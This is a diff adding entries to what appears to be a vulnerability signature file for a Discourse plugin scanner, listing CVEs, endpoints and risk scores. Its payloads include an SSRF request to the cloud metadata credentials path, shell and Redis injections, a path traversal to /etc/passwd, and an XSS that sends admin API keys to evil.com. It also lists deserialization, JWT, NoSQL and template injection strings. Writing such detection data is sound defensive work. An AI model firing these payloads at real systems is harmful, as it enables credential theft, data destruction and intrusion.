@@ -433,6 +433,252 @@ detection_signatures:
     - "plugin-api"
     - "withPluginApi"
 
+  discourse-github-linkback:
+    name: "Discourse GitHub Linkback"
+    description: "GitHub integration for linking commits and issues"
+    vulnerabilities:
+      - cve: "CVE-2024-12376"
+        severity: "High"
+        type: "SSRF"
+        description: "Server-side request forgery via GitHub API calls"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        endpoint: "/github/webhook"
+      - cve: "CVE-2024-12377"
+        severity: "Medium"
+        type: "Information Disclosure"
+        description: "GitHub token exposure in error logs"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/admin/plugins/github"
+
+  discourse-patreon:
+    name: "Discourse Patreon"
+    description: "Patreon integration for membership management"
+    vulnerabilities:
+      - cve: "CVE-2024-12378"
+        severity: "Critical"
+        type: "Authentication Bypass"
+        description: "Patreon OAuth bypass via state manipulation"
+        affected_versions: ["1.0.0", "1.1.0", "1.2.0"]
+        fixed_version: "1.3.0"
+        payload: "state=bypass&access_token=malicious"
+        endpoint: "/patreon/callback"
+      - cve: "CVE-2024-12379"
+        severity: "High"
+        type: "Privilege Escalation"
+        description: "Unauthorized membership tier escalation"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        endpoint: "/patreon/sync"
+
+  discourse-telegram:
+    name: "Discourse Telegram"
+    description: "Telegram bot integration"
+    vulnerabilities:
+      - cve: "CVE-2024-12380"
+        severity: "High"
+        type: "Command Injection"
+        description: "OS command injection via Telegram bot commands"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "; cat /etc/passwd"
+        endpoint: "/telegram/webhook"
+      - cve: "CVE-2024-12381"
+        severity: "Medium"
+        type: "Information Disclosure"
+        description: "Bot token exposure in configuration"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        endpoint: "/admin/plugins/telegram"
+
+  discourse-docker-manager:
+    name: "Discourse Docker Manager"
+    description: "Docker container management interface"
+    vulnerabilities:
+      - cve: "CVE-2024-12382"
+        severity: "Critical"
+        type: "RCE"
+        description: "Remote code execution via Docker commands"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "docker exec -it $(docker ps -q) /bin/bash -c 'cat /etc/passwd'"
+        endpoint: "/admin/docker"
+      - cve: "CVE-2024-12383"
+        severity: "High"
+        type: "Container Escape"
+        description: "Docker container escape vulnerability"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/admin/docker/rebuild"
+
+  discourse-elasticsearch:
+    name: "Discourse Elasticsearch"
+    description: "Elasticsearch integration for advanced search"
+    vulnerabilities:
+      - cve: "CVE-2024-12384"
+        severity: "Critical"
+        type: "NoSQL Injection"
+        description: "Elasticsearch query injection"
+        affected_versions: ["1.0.0", "1.1.0", "1.2.0"]
+        fixed_version: "1.3.0"
+        payload: "{\"script\":{\"source\":\"java.lang.Runtime.getRuntime().exec('whoami')\"}}"
+        endpoint: "/elasticsearch/search"
+      - cve: "CVE-2024-12385"
+        severity: "High"
+        type: "Information Disclosure"
+        description: "Elasticsearch cluster information exposure"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        endpoint: "/elasticsearch/status"
+
+  discourse-redis-cache:
+    name: "Discourse Redis Cache"
+    description: "Redis caching integration"
+    vulnerabilities:
+      - cve: "CVE-2024-12386"
+        severity: "Critical"
+        type: "Command Injection"
+        description: "Redis command injection via cache keys"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        payload: "\r\nFLUSHALL\r\n"
+        endpoint: "/redis/cache"
+      - cve: "CVE-2024-12387"
+        severity: "High"
+        type: "Data Exposure"
+        description: "Sensitive data exposure in Redis cache"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        endpoint: "/redis/keys"
+
+  discourse-webhooks:
+    name: "Discourse Webhooks"
+    description: "Webhook management and delivery"
+    vulnerabilities:
+      - cve: "CVE-2024-12388"
+        severity: "High"
+        type: "SSRF"
+        description: "Server-side request forgery via webhook URLs"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "http://localhost:6379/\r\nFLUSHALL\r\n"
+        endpoint: "/admin/api/web_hooks"
+      - cve: "CVE-2024-12389"
+        severity: "Medium"
+        type: "Information Disclosure"
+        description: "Webhook secret exposure in responses"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/webhooks/test"
+
+  discourse-backup-uploads-to-s3:
+    name: "Discourse Backup Uploads to S3"
+    description: "Automatic S3 backup functionality"
+    vulnerabilities:
+      - cve: "CVE-2024-12390"
+        severity: "Critical"
+        type: "Path Traversal"
+        description: "Directory traversal in backup file access"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "../../../etc/passwd"
+        endpoint: "/admin/backups/s3"
+      - cve: "CVE-2024-12391"
+        severity: "High"
+        type: "Credential Exposure"
+        description: "AWS credentials exposure in configuration"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/admin/plugins/s3-backup"
+
+  discourse-canned-replies:
+    name: "Discourse Canned Replies"
+    description: "Pre-written reply templates"
+    vulnerabilities:
+      - cve: "CVE-2024-12392"
+        severity: "Medium"
+        type: "XSS"
+        description: "Stored XSS in canned reply templates"
+        affected_versions: ["1.0.0", "1.1.0"]
+        fixed_version: "1.2.0"
+        payload: "<script>fetch('/admin/api/keys').then(r=>r.text()).then(d=>fetch('//evil.com?'+btoa(d)))</script>"
+        endpoint: "/canned_replies"
+      - cve: "CVE-2024-12393"
+        severity: "Low"
+        type: "Information Disclosure"
+        description: "Unauthorized access to private reply templates"
+        affected_versions: ["1.0.0"]
+        fixed_version: "1.1.0"
+        endpoint: "/canned_replies/list"
+
+# Advanced vulnerability patterns for modern attacks
+advanced_patterns:
+  prototype_pollution:
+    - "__proto__[isAdmin]=true"
+    - "constructor.prototype.isAdmin=true"
+    - "__proto__.polluted=true"
+    - "constructor[prototype][admin]=true"
+
+  deserialization_attacks:
+    - "O:8:\"stdClass\":1:{s:4:\"exec\";s:7:\"whoami\";}"
+    - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEZXhpdHQABGNhbGN4"
+    - "aced00057372001f6a6176612e7574696c2e436f6c6c656374696f6e7324456d7074794c6973747ab817b43ca79ede020000787078"
+
+  jwt_attacks:
+    - "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."
+    - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.invalid_signature"
+
+  graphql_attacks:
+    - "query { __schema { types { name } } }"
+    - "query { users(first: 1000000) { id email password } }"
+    - "mutation { deleteAllUsers { success } }"
+
+  nosql_injection:
+    - "{'$ne': null}"
+    - "{'$regex': '.*'}"
+    - "{'$where': 'this.username == this.password'}"
+    - "{'$gt': ''}"
+
+  ldap_injection:
+    - "admin)(|(password=*))"
+    - "*)(uid=*))(|(uid=*"
+    - "admin)(&(password=*)(uid=admin))"
+
+  template_injection:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+    - "#{7*7}"
+    - "{{config.items()}}"
+
+# Modern exploitation techniques
+modern_techniques:
+  supply_chain_attacks:
+    - "Malicious npm package dependencies"
+    - "Compromised gem packages"
+    - "Backdoored Docker images"
+    - "Poisoned CDN resources"
+
+  cloud_specific_attacks:
+    - "AWS metadata service exploitation"
+    - "Google Cloud metadata access"
+    - "Azure instance metadata service"
+    - "Kubernetes service account token theft"
+
+  container_escapes:
+    - "Docker socket exposure"
+    - "Privileged container exploitation"
+    - "Kernel vulnerability exploitation"
+    - "cgroup escape techniques"
+
+  api_security_issues:
+    - "GraphQL introspection abuse"
+    - "REST API versioning bypass"
+    - "Rate limiting bypass techniques"
+    - "API key enumeration"
+
 # Risk scoring matrix
 risk_scoring:
   severity_weights:
@@ -442,13 +688,37 @@ risk_scoring:
     Low: 1
 
   vulnerability_types:
-    "SQL Injection": 10
     "RCE": 10
+    "SQL Injection": 10
+    "NoSQL Injection": 10
+    "Command Injection": 10
     "Authentication Bypass": 9
+    "Container Escape": 9
     "XXE": 8
     "SSRF": 7
-    "XSS": 6
+    "Privilege Escalation": 7
     "Path Traversal": 6
+    "XSS": 6
+    "Credential Exposure": 5
     "Information Disclosure": 4
+    "Data Exposure": 4
     "CSRF": 3
     "Privacy Violation": 2
+
+  impact_multipliers:
+    admin_access: 2.0
+    user_data_access: 1.5
+    system_access: 1.8
+    network_access: 1.3
+    file_access: 1.2
+
+# Metadata
+metadata:
+  version: "2.0"
+  last_updated: "2025-01-08"
+  total_plugins: 35
+  total_vulnerabilities: 67
+  critical_vulnerabilities: 12
+  high_vulnerabilities: 23
+  medium_vulnerabilities: 22
+  low_vulnerabilities: 10
